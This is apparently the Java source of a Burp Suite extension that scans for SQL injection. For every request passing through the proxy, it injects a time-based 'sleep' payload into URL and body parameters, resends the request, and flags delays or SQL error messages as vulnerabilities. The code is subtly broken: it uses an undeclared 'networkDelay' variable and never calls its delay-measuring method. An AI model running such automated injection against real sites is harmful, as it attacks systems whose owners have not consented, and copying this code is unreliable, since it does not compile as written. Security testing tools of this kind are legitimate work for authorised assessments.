package burp;

import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.io.PrintWriter;
import java.net.URLEncoder;

public class BurpExtender implements IBurpExtender, IHttpListener
{
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private PrintWriter stdout;
    private String ExtenderName = "SQL Inject Scan";
    private int time = 4;
    private List<byte[]> payloads = new ArrayList<byte[]>(){{
        add(("11^sleep("+time+")%23'^sleep("+time+")%23\"^sleep("+time+")%23").getBytes());
    }};


    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        stdout = new PrintWriter(callbacks.getStdout(), true);
        callbacks.printOutput("Author: Passer6y");
        this.callbacks = callbacks;
        helpers = callbacks.getHelpers();
        callbacks.setExtensionName(ExtenderName);
        callbacks.registerHttpListener(this);
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest,IHttpRequestResponse messageInfo)
    {

        if(!messageIsRequest){
            if ((toolFlag == 4)) {//经过Proxy工具的流量// 请求结束之后
                for(byte[] payload:payloads){
                    attack(messageInfo, payload);
                }
            }
        }
    }

    public void attack(IHttpRequestResponse messageInfo, byte[] payload){
        List<int[]> matches = new ArrayList<>();
        IHttpService iHttpService = messageInfo.getHttpService();
        IRequestInfo analyzeRequest = this.helpers.analyzeRequest(messageInfo);
        // this.stdout.println("[*] Current URL:" + analyzeRequest.getUrl());
        List<IParameter> paraList = analyzeRequest.getParameters();
        for (IParameter para : paraList){
            if (para.getType() == 0 || para.getType() == 1){
                //参数共有7种格式，0是URL参数，1是body参数，2是cookie参数 （helpers.updateParameter只支持这三种），6是json参数
                String key = para.getName();
                String value = para.getValue();
                try {
                    String changedValue = value + this.helpers.bytesToString(payload);
                    byte[] new_Request = messageInfo.getRequest();
                    IParameter newPara = this.helpers.buildParameter(key, changedValue, para.getType()); //构造新的参数
                    new_Request = this.helpers.updateParameter(new_Request, newPara); //构造新的请求包
                    long startTime = System.currentTimeMillis();
                    IHttpRequestResponse messageInfoExp = this.callbacks.makeHttpRequest(iHttpService,  new_Request); //  发送含poc的包
                    long sleepTime = System.currentTimeMillis() - startTime;
                    if(sleepTime - networkDelay > this.time*1000)
                    {

                        //this.stdout.println("[+] Find SQL Time Delay Injection Vulnerable: " + analyzeRequest.getUrl());
                        //this.stdout.println("Payload: " + key+"="+changedValue + " ,sleep time: " + Long.toString(sleepTime/1000) + ", Netwok Delay: " + Long.toString(networkDelay) + "ms");
                        this.callbacks.addScanIssue(new CustomScanIssue(
                                iHttpService,
                                analyzeRequest.getUrl(),
                                new IHttpRequestResponse[]{callbacks.applyMarkers(messageInfoExp, null, matches)},
                                "SQL Time Delay Injection",
                                "Payload: " + key+"="+changedValue + " ,sleep time: " + Long.toString(sleepTime/1000) + ", Netwok Delay: " + Long.toString(networkDelay) + "ms",
                                "High"));
                    }

                    // 检测响应包是否有报错信息
                    if(detectSqlError(messageInfoExp)){
                        //this.stdout.println("[+] Find Sql Error Injection Vulnerable: " + analyzeRequest.getUrl());
                        //this.stdout.println("Payload: " + key + "=" + changedValue);
                        this.callbacks.addScanIssue(new CustomScanIssue(
                                iHttpService,
                                analyzeRequest.getUrl(),
                                new IHttpRequestResponse[]{callbacks.applyMarkers(messageInfoExp, null, matches)},
                                "SQL Error Injection",
                                key + "=" + changedValue,
                                "High"));
                    }



                } catch (Exception e) {
                    stdout.println(e.getMessage());
                    callbacks.printError(e.getMessage());
                }
            }

        }
    }

        // 为了提高精度...
        public long calcNetworkDelay(IHttpRequestResponse messageInfo){
            IHttpService iHttpService = messageInfo.getHttpService();
            long startTime = System.currentTimeMillis();
            this.callbacks.makeHttpRequest(iHttpService,  messageInfo.getRequest());
            return System.currentTimeMillis() - startTime;
        }

        public boolean detectSqlError(IHttpRequestResponse messageInfoExp){
            IResponseInfo analyzeResponseExp = this.helpers.analyzeResponse(messageInfoExp.getResponse());
            String responseInfo = new String(messageInfoExp.getResponse());
            if(responseInfo.equals("")){
                return false;
            }
            String resBody = responseInfo.substring(analyzeResponseExp.getBodyOffset());
            if(resBody.contains("SQL syntax") || resBody.contains("sql syntax") ||  resBody.contains("SQLSTATE[") || resBody.contains("syntax error")){
                return true;
            }
            return false;
        }

}

//
// class implementing IScanIssue to hold our custom scan issue details
//
class CustomScanIssue implements IScanIssue {
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String severity;

    public CustomScanIssue(
            IHttpService httpService,
            URL url,
            IHttpRequestResponse[] httpMessages,
            String name,
            String detail,
            String severity) {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
    }

    @Override
    public URL getUrl() {
        return url;
    }

    @Override
    public String getIssueName() {
        return name;
    }

    @Override
    public int getIssueType() {
        return 0;
    }

    @Override
    public String getSeverity() {
        return severity;
    }

    @Override
    public String getConfidence() {
        return "Certain";
    }

    @Override
    public String getIssueBackground() {
        return null;
    }

    @Override
    public String getRemediationBackground() {
        return null;
    }

    @Override
    public String getIssueDetail() {
        return detail;
    }

    @Override
    public String getRemediationDetail() {
        return null;
    }

    @Override
    public IHttpRequestResponse[] getHttpMessages() {
        return httpMessages;
    }

    @Override
    public IHttpService getHttpService() {
        return httpService;
    }

}